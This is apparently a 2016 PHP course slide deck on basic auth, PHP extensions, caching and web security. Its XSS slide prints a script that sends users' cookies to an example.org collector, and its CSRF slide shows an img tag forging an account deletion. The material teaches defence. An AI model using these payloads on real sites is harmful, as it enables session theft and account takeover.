# PHP / MySQL
## HTTP/PHP miscellaneous

*Pre-requisites: lesson 10*

*ECV Digital - 14/01/2016*

---
## HTTP Basic auth
The most basic authentification system
- Uses static, standard fields in the HTTP header
- Require nothing but the HTTP protocol
- No confidentiality for the transmitted credentials 

[More info](https://en.wikipedia.org/wiki/Basic_access_authentication) <!-- .element: target="_blank" -->

The basic auth system is handled by **the webserver directly**

--
## Examples

**Nginx**
```bash
location / { # Written in the main configuration file
    auth_basic           "closed site";
    auth_basic_user_file conf/htpasswd;
}
```
[More info](http://nginx.org/en/docs/http/ngx_http_auth_basic_module.html) <!-- .element: target="_blank" -->

 ---

**Apache**
```bash
AuthType Basic # Can be written in an .htaccess file
AuthName "Restricted Files"
AuthBasicProvider file
AuthUserFile /usr/local/apache/passwd/passwords
```
[More info](https://httpd.apache.org/docs/2.2/howto/auth.html) <!-- .element: target="_blank" -->

---
## Extensions
Multiple [types of extensions](https://secure.php.net/manual/fr/extensions.membership.php) <!-- .element: target="_blank" -->
- Core extensions
- Bundled extensions
- External extensions 
- PECL extensions

--
## Core Extensions
They are part of the PHP CORE (and actually are not extensions).

They can't be removed, see them more like basic structures of PHP internals
> - Arrays
- Sessions
- Streams
- ...

--
## Bundled extensions
Those extension are bundled with PHP by default.

You can remove them by recompiling your own PHP (Could be usefull for Security and/or performance)

> - FTP
- JSON
- PDO
- Shared memory
- ...

--
## External extensions 
These extensions are bundled with PHP but in order to compile them, external libraries will be needed.

> - cURL
- LDAP
- MySQL
- zip
- ...

--
## PECL extensions
Those are the community based extensions for PHP.

[PECL = PHP Extension Comunnity Library](https://pecl.php.net/) <!-- .element: target="_blank" -->

You have a [lot of them](https://pecl.php.net/packages.php) <!-- .element: target="_blank" -->

They might requires external depedencies, most of them can be installed thanks to [PEAR](http://pear.php.net/) <!-- .element: target="_blank" -->

---
## Performance
Most of time, high performance is not achieved by improving algorithm, but mainly thanks to [CACHING](https://en.wikipedia.org/wiki/Cache_(computing&#41;) <!-- .element: target="_blank" -->

> Remember: PHP is stateless, and your code has to be compiled each time a request is handled

In the PHP world the main used library is [APC](http://php.net/manual/fr/book.apc.php) <!-- .element: target="_blank" -->

Here is a [simple explanation](http://stackoverflow.com/questions/5612945/what-is-a-bytecode-cache-and-how-can-i-use-one-in-php) <!-- .element: target="_blank" -->

--
## Caching
A few points about caching:
- You can cache anything
  - The html page of any request (varnish, etc.)
  - Assets on CDN (img, css, js, etc.)
  - PHP Code (APC, etc.)
  - Event some internal results in your code (Memoization, etc.)
- There is caching in the CPU/GPU

> The ultimate goal of caching: Computing any result only once

---
## Security
The basics of security is all about configuring your server right.

Here is the official [PHP manual](http://php.net/manual/en/security.php) <!-- .element: target="_blank" -->

[Here are some basics recomendations](http://www.cyberciti.biz/tips/php-security-best-practices-tutorial.html) <!-- .element: target="_blank" -->

--
## XSS
Cross-site scripting (XSS) is one of the most common attacks. 

The simplicity of this attack and the number of vulnerable applications in existence make it very attractive to malicious users. 

An XSS attack exploits the user’s trust in the application

It can happen anytime you dump into your code, some user input (images, url, text, etc.)

--
## XSS
Consider a form where a user can enter some text, like a input chat box for example.

The user message will appear in the current "room" of users.
What if you forgot to escape the user input before displaying it in the html view and a user type this:

```javascript
  < script> // I add an extra space just to display it correctly
  document.location = 'http://example.org/getcookies.php?cookies=' + document.cookie;
  < /script>
```

What happens ?

--
## XSS
> - No one will see any meaningful message in the chat 
- All users in the room will be redirected to the given URL and their cookies will be compromised. 

**Now the attacker can impersonate all the users...**

More information on XSS
- [Wikipedia](https://en.wikipedia.org/wiki/Cross-site_scripting) <!-- .element: target="_blank" -->
- [OWASP](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS&#41;) <!-- .element: target="_blank" -->

-- 
## CSRF
A cross-site request forgery (CSRF) is 
- An attack that attempts to cause a victim to send arbitrary HTTP requests
- Usually to URLs requiring privileged access
- Using the victim’s existing session to gain access. 

Whereas an XSS attack exploits the user’s trust in an application, a forged request exploits an application’s trust in a user.

> - GET Requests are easily forged
- POST request can be forged too !

-- 
## CSRF
Suppose a website at which registered users can delete their account thanks to an url like
**`http://example.org/delete.php`**

Now, any malicious can add on its own website this:
```
<img src="http://example.org/delete.php" />
<!-- This is actually making a real call for the image -->
```
Effectively making any users logged into your website to delete their account

-- 
## CSRF
To protect yourself against CSRF, you must:
- Force the use of POST over GET
- Set a token that will be checked by the processing script 

```php
<?php
   session_start();
   $token = md5(uniqid(rand(), TRUE));
   $_SESSION['token'] = $token;
?>
<form action="checkout.php" method="POST">
  <input type="hidden" name="token" value="<?php echo $token; ?>">
  <!-- rest of the form -->
</form>

<?php
// ensure token is set and that the value submitted by the client matches the value in the user's session
if (isset($_POST['token']) && $_POST['token'] === $_SESSION['token']) {
   // Token is valid, continue processing form data
}
?>
```

--
## CSRF
If your site is also vulnerable to XSS attacks, any malicious users can have full power over your website

More information on CSRF
- [Wikipedia](https://en.wikipedia.org/wiki/Cross-site_request_forgery) <!-- .element: target="_blank" -->
- [OWASP](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF&#41;) <!-- .element: target="_blank" -->

It happens that my website https://explee.com has a CSRF vulnerability on the `logout` link. Check the csrf.html file!

--
## Email Injection
Based on mail header injjection

More information here:
- [Wikipedia](https://en.wikipedia.org/wiki/Email_injection) <!-- .element: target="_blank" -->
- [An example](http://www.damonkohler.com/2008/12/email-injection.html) <!-- .element: target="_blank" -->


